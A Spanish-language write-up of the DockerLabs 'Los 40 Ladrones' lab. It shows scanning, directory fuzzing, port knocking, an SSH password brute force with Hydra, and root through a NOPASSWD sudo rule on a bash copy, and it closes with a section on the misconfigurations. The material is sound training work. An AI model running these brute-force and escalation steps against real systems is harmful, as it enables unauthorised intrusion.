# Los 40 Ladrones (DockerLabs) — Writeup

Dificultad: fácil

El nombre de esta máquina viene directamente de "Alí Babá y los 40 ladrones", y el guiño no podía ser más literal: aquí también hace falta pronunciar la fórmula mágica correcta para que la puerta se abra. Solo que en vez de "ábrete sésamo", la contraseña son tres números de puerto en el orden exacto, y la cueva del tesoro es un servicio SSH que ni siquiera existe hasta que se dice la palabra clave.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El reto combina una técnica poco habitual en las máquinas fáciles —**port knocking**— con una fuerza bruta SSH bastante convencional una vez superada esa primera barrera. El truco de fondo es entender que un puerto cerrado en un escaneo de Nmap no siempre significa "no hay nada ahí" — a veces significa "hay algo, pero no vas a verlo hasta que llames a la puerta de la forma correcta".

---

## Paso 0: desplegar el laboratorio

```bash
unzip los40ladrones.zip
bash auto_deploy.sh los40ladrones.tar
```

Con la IP confirmada por el script, toca reconocimiento estándar.

---

## Paso 1: primer escaneo — solo hay una puerta visible

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p80 172.17.0.2
```

```
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Un único puerto abierto, y encima con la página de bienvenida por defecto de Apache — la señal más clara posible de que no hay nada útil a simple vista y que toca fuzzear directorios.

---

## Paso 2: fuzzing, y una nota que no es una nota cualquiera

```bash
gobuster dir -u http://172.17.0.2/ -w directory-list-2.3-medium.txt -x html,php,txt -t 100 -k -r
```

```
/index.html      (Status: 200)
/qdefense.txt     (Status: 200) [Size: 111]
```

El archivo `/qdefense.txt` destaca por su nombre poco convencional. Al abrirlo:

```
Recuerda llama antes de entrar, no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

Un mensaje que, leído con la clave adecuada, es en realidad una instrucción técnica disfrazada de anécdota: "llama antes de entrar" en el contexto de redes y puertos apunta directamente a **port knocking** — una técnica de seguridad por oscuridad donde un servicio permanece invisible y cerrado hasta que el cliente envía una secuencia específica de intentos de conexión a un conjunto predeterminado de puertos, en un orden concreto. Los tres números (7000, 8000, 9000) son exactamente esa secuencia, y "toctoc" no es un chiste gratuito — es, además, el nombre del usuario que vamos a necesitar más adelante.

---

## Paso 3: llamando a la puerta en el orden correcto

```bash
knock 172.17.0.2 7000 8000 9000
```

La herramienta `knock` envía, en el orden indicado, intentos de conexión a cada uno de esos puertos. El servicio de firewall del sistema objetivo (normalmente configurado con `iptables` y un demonio como `knockd`) está escuchando esos intentos en segundo plano, y al reconocer la secuencia exacta, abre dinámicamente el acceso a un puerto que hasta ese momento permanecía completamente cerrado ante cualquier escaneo.

Repitiendo el escaneo completo justo después:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

```
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Y ahí está: el puerto **22** ha aparecido de la nada. No estaba filtrado ni oculto de forma pasiva — simplemente no existía como puerto accesible hasta que la secuencia de knocking lo activó. Es una demostración perfecta de por qué un solo escaneo de Nmap nunca debería considerarse "la verdad definitiva" sobre qué servicios corren en una máquina.

---

## Paso 4: fuerza bruta contra un usuario ya confirmado por la propia pista

El mensaje de `/qdefense.txt` ya había dejado caer el nombre "toctoc" en un contexto que, retrospectivamente, apunta también a un nombre de usuario del sistema. Con el SSH ahora accesible:

```bash
hydra -l toctoc -P rockyou.txt ssh://172.17.0.2 -t 64
```

```
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
```

Contraseña encontrada. Conexión directa:

```bash
ssh toctoc@172.17.0.2
```

Con `kittycat` como contraseña, acceso conseguido.

---

## Paso 5: escalada — una regla de sudo que no deja lugar a dudas

```bash
sudo -l
```

```
User toctoc may run the following commands on f120d0baef4d:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

La primera línea ya lo dice todo sin necesidad de mayor análisis: `toctoc` puede ejecutar **una copia completa de bash** como root, sin contraseña. No hace falta ningún truco de escape, ninguna técnica de GTFOBins, ningún path hijacking — es, directamente, la llave maestra entregada sin ningún tipo de restricción.

```bash
sudo /opt/bash
```

```
whoami
root
```

Root conseguido en la línea más corta posible de todo este reto — el verdadero desafío de esta máquina estaba enteramente en la fase de reconocimiento, no en la escalada.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Pista inicial | `/qdefense.txt` con secuencia de port knocking disfrazada de anécdota |
| Técnica de acceso oculto | Port knocking (puertos 7000, 8000, 9000) |
| Servicio revelado | SSH (puerto 22), invisible hasta completar la secuencia |
| Usuario y contraseña | toctoc:kittycat, vía Hydra |
| Vector de escalada | `sudo NOPASSWD` sobre una copia completa de `/opt/bash` |
| Resultado final | root, sin ninguna técnica de escape necesaria |

---

## Qué falló aquí (y cómo se evita)

1. **La secuencia de port knocking documentada en un archivo público del servidor web.** El port knocking, como técnica, depende completamente de que la secuencia permanezca secreta — es seguridad por oscuridad en su forma más pura. Dejar esa secuencia escrita, aunque sea en tono de broma, en un archivo accesible desde la web anula por completo cualquier protección que la técnica pudiera ofrecer.
2. **Contraseña de usuario reutilizable y presente en diccionarios comunes.** `kittycat`, como tantas otras contraseñas vistas en retos similares, cae ante un ataque de diccionario básico sin mayor esfuerzo.
3. **Regla de sudo NOPASSWD sobre una copia completa del intérprete bash.** Esta es la configuración más permisiva posible dentro de sudo — no hay ninguna restricción de comandos, ningún binario específico limitado: es, literalmente, entregar una terminal de root sin condiciones. Ninguna regla de sudo debería conceder acceso a un shell completo sin una razón operativa extremadamente justificada.

---

## Referencias

- knockd (port knocking): https://www.zeroflux.org/projects/knock
- THC Hydra: https://github.com/vanhauser-thc/thc-hydra
- DockerLabs: https://dockerlabs.es/
